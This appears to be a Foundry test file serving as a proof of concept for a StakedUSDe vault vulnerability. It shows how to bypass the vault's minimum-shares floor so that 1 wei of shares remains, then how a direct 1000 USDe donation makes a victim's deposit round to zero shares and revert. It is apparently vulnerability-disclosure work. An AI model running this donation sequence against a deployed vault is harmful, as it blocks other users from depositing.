// SPDX-License-Identifier: MIT
pragma solidity >=0.8;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "./contracts/USDe.sol";
import "./contracts/StakedUSDe.sol";
import "./contracts/interfaces/IUSDe.sol";
import "./contracts/interfaces/IStakedUSDe.sol";

contract MinSharesBypassPoC is Test {
    USDe public usdeToken;
    StakedUSDe public stakedUSDe;

    address public owner;
    address public whale;
    address public survivor;
    address public victim;
    address public attacker;

    bytes32 internal constant BLACKLIST_MANAGER_ROLE =
        keccak256("BLACKLIST_MANAGER_ROLE");

    bytes32 internal constant FULL_RESTRICTED_STAKER_ROLE =
        keccak256("FULL_RESTRICTED_STAKER_ROLE");

    function setUp() public {
        owner = vm.addr(1);
        whale = vm.addr(2);
        survivor = vm.addr(3);
        victim = vm.addr(4);
        attacker = vm.addr(5);

        usdeToken = new USDe(address(this));

        vm.prank(owner);
        stakedUSDe = new StakedUSDe(
            IUSDe(address(usdeToken)),
            owner,
            owner
        );

        usdeToken.setMinter(address(this));

        vm.prank(owner);
        stakedUSDe.grantRole(
            BLACKLIST_MANAGER_ROLE,
            owner
        );
    }

    function test_MinSharesCanBeViolated() public {
        uint256 whaleAmount = 100 ether;

        // Whale stakes 100 USDe.
        usdeToken.mint(whale, whaleAmount);

        vm.startPrank(whale);
        usdeToken.approve(
            address(stakedUSDe),
            whaleAmount
        );
        stakedUSDe.deposit(
            whaleAmount,
            whale
        );
        vm.stopPrank();

        // Survivor stakes exactly 1 wei.
        usdeToken.mint(survivor, 1 wei);

        vm.startPrank(survivor);
        usdeToken.approve(
            address(stakedUSDe),
            1 wei
        );
        stakedUSDe.deposit(
            1 wei,
            survivor
        );
        vm.stopPrank();

        assertEq(
            stakedUSDe.balanceOf(survivor),
            1 wei
        );

        // Fully blacklist whale.
        vm.prank(owner);
        stakedUSDe.addToBlacklist(
            whale,
            true
        );

        assertTrue(
            stakedUSDe.hasRole(
                FULL_RESTRICTED_STAKER_ROLE,
                whale
            )
        );

        // Redistribute the whale's locked amount to address(0).
        vm.prank(owner);
        stakedUSDe.redistributeLockedAmount(
            whale,
            address(0)
        );

        // Only 1 wei of shares remains.
        uint256 remainingSupply =
            stakedUSDe.totalSupply();

        console.log(
            "Remaining sUSDe supply:",
            remainingSupply
        );

        assertEq(
            remainingSupply,
            1 wei
        );

        assertGt(
            remainingSupply,
            0
        );

        assertLt(
            remainingSupply,
            1 ether
        );
    }

    function test_DonationMakesVictimDepositRevert() public {
        // Create the low-share state.
        test_MinSharesCanBeViolated();

        // Attacker donates USDe directly to the vault.
        usdeToken.mint(
            attacker,
            1000 ether
        );

        vm.prank(attacker);
        usdeToken.transfer(
            address(stakedUSDe),
            1000 ether
        );

        // Victim has 500 USDe.
        usdeToken.mint(
            victim,
            500 ether
        );

        uint256 victimBalanceBefore =
            usdeToken.balanceOf(victim);

        uint256 previewedShares =
            stakedUSDe.previewDeposit(
                500 ether
            );

        console.log(
            "Victim previewDeposit shares:",
            previewedShares
        );

        // The exchange rate has become so high
        // that 500 USDe rounds down to zero shares.
        assertEq(
            previewedShares,
            0
        );

        vm.startPrank(victim);

        usdeToken.approve(
            address(stakedUSDe),
            500 ether
        );

        vm.expectRevert(
            IStakedUSDe.InvalidAmount.selector
        );

        stakedUSDe.deposit(
            500 ether,
            victim
        );

        vm.stopPrank();

        // The failed deposit does not take the victim's USDe.
        assertEq(
            usdeToken.balanceOf(victim),
            victimBalanceBefore
        );
    }
}
